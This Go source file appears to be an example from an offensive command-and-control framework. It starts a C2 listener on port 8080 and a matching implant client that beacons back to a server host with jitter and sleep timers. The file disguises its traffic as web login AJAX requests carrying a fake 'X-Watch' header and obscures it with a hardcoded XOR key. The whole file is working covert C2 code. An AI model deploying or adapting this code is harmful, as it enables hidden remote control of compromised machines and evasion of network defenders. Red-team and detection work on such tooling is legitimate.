// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import (
	"os"
	"time"

	"github.com/PurpleSec/logx"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/c2/wrapper"
	"github.com/iDigitalFlame/xmt/com/wc2"
	"github.com/iDigitalFlame/xmt/util/text"
)

func exampleWC2() {
	if len(os.Args) == 2 {
		var (
			s = c2.NewServer(logx.Console(logx.Debug))
			x = wc2.New(time.Second * 10)
		)
		x.Target.URL = text.Matcher("/login/ajax/%s/%d")
		x.Target.Header("X-Watch", text.Matcher("%5fs-%5fs"))
		x.ServeDirectory("/", "/tmp")
		x.TargetAsRule()

		v := cfg.Static{
			L: x,
			J: 30,
			S: time.Second * 5,
			H: "0.0.0.0:8080",
			W: wrapper.NewXOR([]byte("this is my special XOR key")),
		}

		l, err := s.Listen("http1", "", v)
		if err != nil {
			panic(err)
		}

		l.Wait()
		return
	}

	x := wc2.NewClient(0, &wc2.Target{URL: text.Matcher("/login/ajax/%s/%d")})
	x.Target.Header("X-Watch", text.Matcher("%5fs-%5fs"))

	v := cfg.Static{
		C: x,
		J: 30,
		S: time.Second * 5,
		H: "xmt-server:8080",
		W: wrapper.NewXOR([]byte("this is my special XOR key")),
	}

	s, err := c2.Connect(logx.Console(logx.Debug), v)
	if err != nil {
		panic(err)
	}
	s.Wait()
}
